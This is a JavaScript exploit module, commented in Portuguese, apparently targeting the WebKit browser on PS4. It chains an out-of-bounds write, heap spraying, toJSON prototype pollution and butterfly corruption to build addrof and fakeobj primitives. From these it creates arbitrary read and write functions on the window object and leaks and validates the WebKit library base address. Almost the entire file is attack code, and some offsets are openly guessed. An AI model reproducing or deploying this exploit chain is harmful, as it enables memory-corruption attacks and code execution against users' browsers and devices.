// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO PARA v83_R44-Butterfly)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    arb_read, // Usaremos arb_read para vazar a base do WebKit no final
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; //

// Novo nome para a estratégia R44 (Butterfly Corruption)
export const FNAME_MODULE_BUTTERFLY_CORRUPTION_R44 = "WebKitExploit_ButterflyCorruption_R44";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE = 0xABABABAB;

// --- Nova Estratégia: Butterfly Corruption ---
const SPRAY_SIZE = 200; // Número de objetos para pulverizar no heap
let victim_spray = [];
let shared_buffer = new ArrayBuffer(8); // Buffer para troca de dados entre addrof/fakeobj
let shared_float_view = new Float64Array(shared_buffer);
let shared_uint32_view = new Uint32Array(shared_buffer);

let corrupted_victim_index = -1; // Índice do array corrompido no spray
let addrof_primitive = null;
let fakeobj_primitive = null;
let webkit_base_address = null;

// A sonda que fará a corrupção do butterfly
function toJSON_ButterflyCorruptionProbe_R44() {
    // A propriedade 'a' no 'this' confuso provavelmente se sobreporá aos metadados
    // do objeto adjacente. Ajustar 'a', 'b', etc., pode ser necessário.
    // Estamos mirando no ponteiro 'butterfly' do JSArray dentro do nosso objeto de spray.
    this.a = shared_buffer;

    // Se a corrupção funcionar, um dos nossos arrays no 'victim_spray' agora
    // terá seu 'butterfly' apontando para nosso 'shared_buffer'.
    // Vamos procurar por ele.
    for (let i = 0; i < SPRAY_SIZE; i++) {
        if (victim_spray[i].corrupted_array.length > 0) { // O tamanho muda de 0 para um valor grande
             if (victim_spray[i].corrupted_array[0] === shared_float_view[0]) {
                 logS3(`[PROBE_R44] SUCESSO! Butterfly do spray[${i}] corrompido!`, "vuln");
                 corrupted_victim_index = i;
                 break;
             }
        }
    }
    return { probe_executed: "R44-Butterfly" };
}


function build_primitives() {
    if (corrupted_victim_index === -1) {
        throw new Error("Não foi possível construir primitivas: nenhum vítima corrompido encontrado.");
    }
    const victim = victim_spray[corrupted_victim_index].corrupted_array;

    // Primitiva AddrOf (Endereço de)
    addrof_primitive = (obj) => {
        shared_buffer.leak_slot = obj; // Coloca o objeto em uma propriedade do nosso buffer compartilhado
        const addr_double = victim[1]; // Lê o ponteiro do 'butterfly' do nosso shared_buffer, que agora contém o endereço de 'leak_slot'
        shared_uint32_view[0] = 0;     // Limpa para evitar lixo
        shared_uint32_view[1] = 0;
        return new AdvancedInt64(addr_double);
    };

    // Primitiva FakeObj (Objeto Falso)
    fakeobj_primitive = (addr_int64) => {
        const addr_double = addr_int64.asDouble();
        victim[1] = addr_double; // Escreve o endereço desejado no butterfly do shared_buffer
        return shared_buffer.leak_slot; // Retorna o objeto falso
    };

    logS3("Primitivas `addrof` e `fakeobj` construídas com sucesso.", "good");
}

async function self_test_primitives() {
    logS3("--- Auto-Teste das Primitivas (addrof/fakeobj) ---", "subtest");
    const test_obj = { a: 0x41414141, b: 0x42424242 };
    
    const test_obj_addr = addrof_primitive(test_obj);
    logS3(`  addrof(test_obj) -> ${test_obj_addr.toString(true)}`, "leak");
    if (!isAdvancedInt64Object(test_obj_addr) || test_obj_addr.high() === 0) {
        throw new Error(`Auto-teste addrof falhou: endereço vazado é inválido.`);
    }

    const fake_obj = fakeobj_primitive(test_obj_addr);
    logS3(`  fakeobj(addr) -> Objeto obtido.`, "info");
    
    if (fake_obj.a === test_obj.a && fake_obj.b === test_obj.b) {
        logS3("  SUCESSO: Auto-teste de addrof/fakeobj passou! O objeto falso corresponde ao original.", "vuln");
        return true;
    } else {
        logS3(`  FALHA: Auto-teste de addrof/fakeobj falhou. fake_obj.a=${toHex(fake_obj.a)} (esperado ${toHex(test_obj.a)})`, "critical");
        return false;
    }
}

// Primitiva de leitura arbitrária usando nossas novas `addrof` e `fakeobj`
function create_arb_rw_primitives() {
    const FNAME_ARBRW = "create_arb_rw_primitives";
    logS3("--- Construindo Leitura/Escrita Arbitrária (arb_read/arb_write) ---", "subtest", FNAME_ARBRW);

    const dataview_backing = new Uint8Array(VICTIM_BUFFER_SIZE);
    const dataview_addr = addrof_primitive(dataview_backing);
    logS3(`  Endereço do backing do DataView: ${dataview_addr.toString(true)}`, 'leak', FNAME_ARBRW);
    
    // O endereço para os dados reais está em um offset dentro da estrutura do Uint8Array
    const data_addr_offset = new AdvancedInt64(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 0); 
    const structure_addr = fakeobj_primitive(dataview_addr);
    
    // Lendo o ponteiro original para os dados
    const original_data_ptr = new AdvancedInt64(structure_addr[2], structure_addr[3]); // Assumindo que o ponteiro está em [offset 0x10]
     logS3(`  Ponteiro de dados original (m_vector): ${original_data_ptr.toString(true)}`, 'leak', FNAME_ARBRW);

    const fake_array_struct = [
        structure_addr[0], // Copia o cabeçalho
        structure_addr[1],
        0, // Placeholder para o ponteiro de dados (low)
        0, // Placeholder para o ponteiro de dados (high)
        0xFFFFFFFF, // Tamanho (low)
        0, // Tamanho (high)
    ];

    const fake_array_addr = addrof_primitive(fake_array_struct);
    // Remove o bit de "boxing" (se for um double) para obter o endereço real
    const unboxed_fake_array_addr = fake_array_addr.sub(new AdvancedInt64(1, 0));
    logS3(`  Endereço do nosso array falso: ${unboxed_fake_array_addr.toString(true)}`, 'leak', FNAME_ARBRW);
    
    const fake_dataview = fakeobj_primitive(unboxed_fake_array_addr);
    logS3("  DataView Falso criado.", 'good', FNAME_ARBRW);

    window.arb_read = (addr, len) => {
        if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
        fake_array_struct[2] = addr.low();
        fake_array_struct[3] = addr.high();

        let result = new Uint8Array(len);
        for(let i = 0; i < len; i++) {
            result[i] = fake_dataview[i];
        }
        return result.buffer;
    };

    window.arb_write = (addr, data) => {
        if (!isAdvancedInt64Object(addr)) addr = new AdvancedInt64(addr);
        fake_array_struct[2] = addr.low();
        fake_array_struct[3] = addr.high();
        
        let write_view = new Uint8Array(data);
        for(let i = 0; i < write_view.length; i++) {
            fake_dataview[i] = write_view[i];
        }
    };
    
    logS3("Primitivas `window.arb_read` e `window.arb_write` estão prontas.", "good", FNAME_ARBRW);
}


async function find_webkit_base() {
    logS3("--- Tentando vazar a base da libSceNKWebKit ---", "subtest");
    if (typeof window.arb_read !== 'function') {
        throw new Error("A primitiva arb_read não está disponível.");
    }
    
    const func_obj = window.alert; // Uma função nativa qualquer do WebKit
    const func_addr = addrof_primitive(func_obj);
    logS3(`  Endereço de window.alert: ${func_addr.toString(true)}`, 'leak');

    const executable_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0); //
    const executable_addr_ptr = func_addr.add(executable_offset);
    const executable_addr_buf = window.arb_read(executable_addr_ptr, 8);
    const executable_addr = new AdvancedInt64(new Uint32Array(executable_addr_buf)[0], new Uint32Array(executable_addr_buf)[1]);
    logS3(`  Ponteiro para a instância Executable: ${executable_addr.toString(true)}`, 'leak');
    
    // No PS4, o ponteiro JITCode está em um offset, vamos assumir 0x18 ou similar de Executable.
    // Usaremos um offset conhecido da comunidade ou de reversing.
    const jit_code_offset = new AdvancedInt64(0x18, 0);
    const jit_code_addr_ptr = executable_addr.add(jit_code_offset);
    const jit_code_addr_buf = window.arb_read(jit_code_addr_ptr, 8);
    const jit_code_addr = new AdvancedInt64(new Uint32Array(jit_code_addr_buf)[0], new Uint32Array(jit_code_addr_buf)[1]);
    logS3(`  Ponteiro para JITCode: ${jit_code_addr.toString(true)}`, 'leak');
    
    // A base do WebKit geralmente está alinhada à página (4KB ou 16KB)
    // a partir de um ponteiro de código JIT.
    const page_mask = new AdvancedInt64(0, 0).not().shl(14).not(); // Máscara de 16KB (0xFFFFC000)
    webkit_base_address = jit_code_addr.and(page_mask);

    logS3(`  CANDIDATO À BASE DO WEBKIT: ${webkit_base_address.toString(true)}`, "vuln");

    // Validação simples: ler o cabeçalho ELF
    const elf_header_buf = window.arb_read(webkit_base_address, 4);
    const elf_header_view = new Uint8Array(elf_header_buf);
    if (elf_header_view[0] === 0x7F && elf_header_view[1] === 0x45 && elf_header_view[2] === 0x4C && elf_header_view[3] === 0x46) {
        logS3("  Validação ELF: SUCESSO! Cabeçalho '\x7FELF' encontrado. A base parece correta.", "good");
        return true;
    } else {
        logS3("  Validação ELF: FALHA! Cabeçalho não corresponde a '\x7FELF'.", "error");
        webkit_base_address = null;
        return false;
    }
}


export async function executeButterflyCorruptionStrategy_R44() {
    const FNAME_BASE = FNAME_MODULE_BUTTERFLY_CORRUPTION_R44;
    logS3(`--- Iniciando ${FNAME_BASE}: Butterfly Corruption Strategy ---`, "test", FNAME_BASE);
    document.title = `${FNAME_BASE} Init R44...`;

    // Resetar estado global
    victim_spray = [];
    corrupted_victim_index = -1;
    addrof_primitive = null;
    fakeobj_primitive = null;
    webkit_base_address = null;
    window.arb_read = null;
    window.arb_write = null;
    
    let result = {
        success: false,
        tc_confirmed: false,
        primitives_built: false,
        primitives_tested_ok: false,
        webkit_leak_ok: false,
        webkit_base_candidate: null,
        error: null
    };

    try {
        logS3("FASE 1: Preparação do Heap e Trigger da Type Confusion", "subtest");
        await triggerOOB_primitive({ force_reinit: true }); //
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE, 4); //
        await PAUSE_S3(50);
        
        // Pulveriza o heap com nossos objetos vítimas
        for (let i = 0; i < SPRAY_SIZE; i++) {
            let arr = new Array(0); // Um JSArray pequeno
            let obj = { corrupted_array: arr };
            victim_spray.push(obj);
        }
        logS3(`Heap pulverizado com ${SPRAY_SIZE} objetos vítimas.`, "info");

        // Polui o protótipo e aciona o bug
        let victim_buffer = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        Object.defineProperty(Object.prototype, 'toJSON', { value: toJSON_ButterflyCorruptionProbe_R44, writable: true, configurable: true, enumerable: false });
        
        JSON.stringify(victim_buffer);

        // Restaura o protótipo
        if (origDesc) Object.defineProperty(Object.prototype, 'toJSON', origDesc); else delete Object.prototype['toJSON'];
        
        if (corrupted_victim_index === -1) {
            throw new Error("Type Confusion acionada, mas a corrupção do butterfly falhou. Nenhum vítima encontrado.");
        }
        result.tc_confirmed = true;
        
        logS3("FASE 2: Construção e Teste das Primitivas", "subtest");
        build_primitives();
        result.primitives_built = true;
        result.primitives_tested_ok = await self_test_primitives();
        if (!result.primitives_tested_ok) {
            throw new Error("As primitivas addrof/fakeobj foram construídas, mas falharam no auto-teste.");
        }

        logS3("FASE 3: Criação de R/W Arbitrário e Vazamento da Base do WebKit", "subtest");
        create_arb_rw_primitives();
        result.webkit_leak_ok = await find_webkit_base();
        if (result.webkit_leak_ok) {
            result.webkit_base_candidate = webkit_base_address.toString(true);
            result.success = true;
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO na estratégia R44: ${e.message}`, "critical", FNAME_BASE);
        result.error = e.message;
        console.error(e);
    } finally {
        // Limpeza final
        await clearOOBEnvironment();
        victim_spray = [];
    }
    
    logS3(`--- ${FNAME_BASE} Finalizada. Sucesso Geral: ${result.success} ---`, "test", FNAME_BASE);
    return result;
}
